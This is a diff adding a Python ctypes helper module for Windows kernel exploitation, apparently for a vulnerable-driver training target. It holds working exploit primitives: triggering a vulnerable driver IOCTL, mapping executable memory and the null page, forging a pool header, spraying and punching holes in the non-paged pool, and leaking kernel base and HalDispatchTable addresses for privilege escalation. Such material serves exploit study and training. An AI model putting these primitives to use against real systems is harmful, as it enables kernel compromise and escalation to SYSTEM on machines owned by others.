@@ -1,0 +1,337 @@
+from ctypes import *
+from ctypes.wintypes import *
+import struct, os, sys
+import platform
+
+# Define WinAPI shorthand
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+psapi = windll.Psapi
+
+# Define bitmasks
+GENERIC_READ = 0x80000000
+GENERIC_WRITE = 0x40000000
+OPEN_EXISTING = 0x00000003
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_EXECUTE_READWRITE = 0x00000040
+FILE_DEVICE_UNKNOWN = 0x00000022
+FILE_ANY_ACCESS = 0x00000000
+METHOD_NEITHER = 0x00000003
+
+
+def p32(x):
+	""" Interpret strings as packed binary data (unsigned long) """
+	return struct.pack("<L", x)
+
+
+def ioctl(function, devicetype = FILE_DEVICE_UNKNOWN, access = FILE_ANY_ACCESS, method = METHOD_NEITHER):
+	""" Calculate the IOCTL """
+
+	return ((devicetype << 16) | (access << 14) | (function << 2) | method)
+
+
+def is_system():
+	""" Check if the running process run with SYSTEM privileges """
+
+	whoami = os.popen("whoami").read()
+	if "system" in whoami:
+		return True
+	else:
+		return False
+
+
+def get_handle(lpFileName):
+	""" Get device handler """
+
+	dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
+	dwShareMode = 0
+	lpSecurityAttributes = None
+	dwCreationDisposition = OPEN_EXISTING
+	dwFlagsAndAttributes = 0
+	hTemplateFile = None
+
+	print("[*] Getting device handle")
+	handle = kernel32.CreateFileA(
+				lpFileName,            # _In_     LPCTSTR
+				dwDesiredAccess,       # _In_     DWORD
+				dwShareMode,           # _In_     DWORD
+				lpSecurityAttributes,  # _In_opt_ LPSECURITY_ATTRIBUTES
+				dwCreationDisposition, # _In_     DWORD
+				dwFlagsAndAttributes,  # _In_     DWORD
+				hTemplateFile)         # _In_opt_ HANDLE
+
+	if not handle or handle == -1:
+		sys.exit("[-] Error getting device handle: {:s}".format(FormatError()))
+	else:
+		print("[+] Got device handle: {:#x}".format(handle))
+
+	return handle
+
+
+def trigger(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize):
+	""" Triggering vulnerable IOCTL """
+
+	lpOutBuffer = None
+	nOutBufferSize = 0
+	lpBytesReturned = byref(c_ulong())
+	lpOverlapped = None
+
+	print("[+] Triggering vulnerable IOCTL ...")
+	device = kernel32.DeviceIoControl(
+				hDevice,         # _In_        HANDLE
+				dwIoControlCode, # _In_        DWORD
+				lpInBuffer,      # _In_opt_    LPVOID
+				nInBufferSize,   # _In_        DWORD
+				lpOutBuffer,     # _Out_opt_   LPVOID
+				nOutBufferSize,  # _In_        DWORD
+				lpBytesReturned, # _Out_opt_   LPDWORD
+				lpOverlapped)    # _Inout_opt_ LPOVERLAPPED
+
+	if not device:
+		sys.exit("[-] Error: Not device {:s}".format(FormatError()))
+
+
+def alloc_memory_virtualalloc(lpAddress, dwSize, input):
+	""" Allocate input buffer """
+
+	flAllocationType = (MEM_COMMIT | MEM_RESERVE)
+	flProtect = PAGE_EXECUTE_READWRITE
+
+	print("[*] Allocating input buffer at {:#x}".format(lpAddress))
+	address = kernel32.VirtualAlloc(
+				lpAddress,         # _In_opt_  LPVOID
+				dwSize,            # _In_      SIZE_T
+				flAllocationType,  # _In_      DWORD
+				flProtect)         # _In_      DWORD
+
+	if not address:
+		sys.exit("[-] Error allocating memory: {:#x}".format(kernel32.GetLastError()))
+	else:
+		print("[+] Input buffer allocated at: {:#x}".format(address))
+
+	memmove(address, input, len(input))
+	return address
+
+
+# https://www.exploit-db.com/exploits/34272/
+def alloc_memory(base_address, input, input_size):
+	""" Allocate input buffer """
+
+	print("[*] Allocating input buffer at {:#x}".format(base_address))
+	if platform.architecture()[0] == "64bit":
+		if base_address == None:
+			base_address_c = c_ulonglong(0)
+		else:
+			base_address_c = c_ulonglong(base_address)
+
+		ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
+					POINTER(c_ulonglong),
+					c_ulong,
+					POINTER(c_int),
+					c_int,
+					c_int]
+	else:
+		if base_address == None:
+			base_address_c = c_int(0)
+		else:
+			base_address_c = c_int(base_address)
+
+		ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
+					POINTER(c_int),
+					c_ulong,
+					POINTER(c_int),
+					c_int,
+					c_int]
+
+	input_size_c = c_int(input_size)
+	dwStatus = ntdll.NtAllocateVirtualMemory(
+					-1,
+					byref(base_address_c),
+					0x0,
+					byref(input_size_c),
+					(MEM_RESERVE | MEM_COMMIT),
+					PAGE_EXECUTE_READWRITE)
+	if dwStatus != 0:
+		sys.exit("[-] Error while allocating memory: {:#x}".format(signed_to_unsigned(dwStatus)))
+
+	written = c_ulong()
+	alloc = kernel32.WriteProcessMemory(-1, base_address, input, len(input), byref(written))
+	if alloc == 0:
+		sys.exit("[-] Error while writing our input buffer memory: {:#x}".format(alloc))
+
+	return base_address
+
+
+def alloc_null_page(base_address, size):
+	""" Allocate Null Page """
+
+	print("[*] Allocating null page")
+
+	ProcessHandle = kernel32.GetCurrentProcess()
+	BaseAddress = c_void_p(base_address)
+	ZeroBits = 0
+	RegionSize = c_int(size)
+	AllocationType = (MEM_COMMIT | MEM_RESERVE)
+	Protect = PAGE_EXECUTE_READWRITE
+
+	dwStatus = ntdll.NtAllocateVirtualMemory(
+				ProcessHandle,
+				byref(BaseAddress),
+				ZeroBits,
+				byref(RegionSize),
+				AllocationType,
+				Protect)
+
+	if dwStatus != 0:
+		sys.exit("[-] Error while allocating memory: {:#x}".format(signed_to_unsigned(dwStatus)))
+	else:
+		print("[+] Null page was sucessfully allocated")
+
+
+def pool_header_event():
+	"""
+	Generate pool header for an event object
+
+	kd> !pool 855de2c8
+	Pool page 855de2c8 region is Nonpaged pool
+	 855de000 size:   40 previous size:    0  (Allocated)  Even (Protected)
+	 855de040 size:   30 previous size:   40  (Free)       .B.@
+	 855de070 size:  250 previous size:   30  (Free )  Irp  Process: 85d61750
+	*855de2c0 size:  200 previous size:  250  (Allocated) *Hack
+		Owning component : Unknown (update pooltag.txt)
+	[...]
+	855defc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+
+	kd> dd 855defc0-8
+	855defb8  855defb8 855defb8 04080040 ee657645
+	855defc8  00000000 00000040 00000000 00000000
+	855defd8  00000001 00000001 00000000 0008000c
+	855defe8  87049d80 00000000 00040001 00000000
+	"""
+	print("[*] Generate Non-Paged Pool Event Objects header")
+	pool_header  = p32(0x04080040)  # +0x000 Ulong1: 0x4080040
+	pool_header += p32(0xee657645)  # +0x004 PoolTag: 0xee657645
+	pool_header += p32(0x00000000)
+	pool_header += p32(0x00000040)  # +0x004 NonPagedPoolCharge: 0x40
+	pool_header += p32(0x00000000)
+	pool_header += p32(0x00000000)
+	pool_header += p32(0x00000001)
+	pool_header += p32(0x00000001)
+	pool_header += p32(0x00000000)
+	pool_header += p32(0x00080000)  # +0x00c TypeIndex: 0xc '' => change to 0x00
+
+	return pool_header
+
+
+def spray_event_objects(size):
+	""" Spray the heap with Event Objects """
+
+	object_handles = []
+	lpEventAttributes = None
+	bManualReset = False
+	bInitialState = False
+	lpName = None
+
+	print("[+] Spraying Non-Paged Pool with Event Objects...")
+	for i in range(0, size):
+		handle = kernel32.CreateEventA(
+					lpEventAttributes,   # _In_opt_ LPSECURITY_ATTRIBUTES
+					bManualReset,        # _In_     BOOL
+					bInitialState,       # _In_     BOOL
+					lpName)              # _In_opt_ LPCTSTR
+		object_handles.append(handle)
+
+	return object_handles
+
+
+def spray_ioco_objects(size):
+	""" Spray the heap with IoCompletionReserve Objects """
+
+	object_handles = []
+	lpEventAttributes = None
+	bManualReset = False
+	bInitialState = False
+	lpName = None
+
+	print("[+] Spraying Non-Paged Pool with IoCompletionReserve Objects...")
+	for i in range(0, size):
+		handle = ntdll.NtAllocateReserveObject(
+						byref(HANDLE(0)),    # _Out_    PHANDLE
+						0,                   # _In_opt_ POBJECT_ATTRIBUTES
+						1)                   # _In_     ULONG
+		object_handles.append(handle)
+
+	return object_handles
+
+
+def make_holes_sprayed_region(size, object_handles):
+	""" Making holes in the sprayd kernel """
+
+	print("[+] Creating holes in the sprayed region...")
+	for i in range(0, size, 16):
+		for j in range(0, 8):
+			kernel32.CloseHandle(object_handles[i + j])
+			object_handles[i + j] = None
+
+
+def free_all_alloc(size, object_handles):
+	""" Free all allocations """
+
+	print("[+] Free pool allocations")
+	for i in range(0, size):
+		if (object_handles[i] != None):
+			kernel32.CloseHandle(object_handles[i])
+			object_handles[i] = None
+
+
+# https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
+def get_base_address(driver=None):
+	""" Returns base address of kernel modules """
+
+	if platform.architecture()[0] == "64bit":
+		lpImageBase = (c_ulonglong * 1024)()
+		lpcbNeeded = c_longlong()
+		psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
+	else:
+		lpImageBase = (c_ulong * 1024)()
+		lpcbNeeded = c_long()
+	driver_name_size = c_long()
+	driver_name_size.value = 48
+	psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
+
+	for base_addr in lpImageBase:
+		driver_name = c_char_p("\x00" * driver_name_size.value)
+		if base_addr:
+			psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
+			if driver == None and driver_name.value.lower().find("krnl") != -1:
+				print("[+] Retrieving kernel info...")
+				print("[+] Kernel version: {:s}".format(driver_name.value))
+				print("[+] Kernel base address: {:#x}".format(base_addr))
+
+				return (base_addr, driver_name.value)
+			elif driver_name.value.lower() == driver:
+				print("[+] Retrieving {:s} info...".format(driver_name))
+				print("[+] {:s} base address: {:#x}".format(driver_name, base_addr))
+				
+				return (base_addr, driver_name.value)
+	return None
+
+
+# https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
+def get_haldispatchtable():
+	""" Returns the HalDispatchTable address """
+
+	if platform.architecture()[0] == "64bit":
+		kernel32.LoadLibraryExA.restype = c_uint64
+		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
+		kernel32.GetProcAddress.restype = c_uint64
+
+	(kernel_base, kernel_version) = get_base_address()
+	hKernel = kernel32.LoadLibraryExA(kernel_version, 0, 1)
+	HalDispatchTable = kernel32.GetProcAddress(hKernel, "HalDispatchTable")
+	HalDispatchTable -= hKernel     # Subtracting 'ntkrnlpa' base in user space
+	HalDispatchTable += kernel_base # Add the base address of 'ntkrnpa' in kernel space
+
+	print("[+] HalDispatchTable address: {:#x}".format(HalDispatchTable))
+	return HalDispatchTable
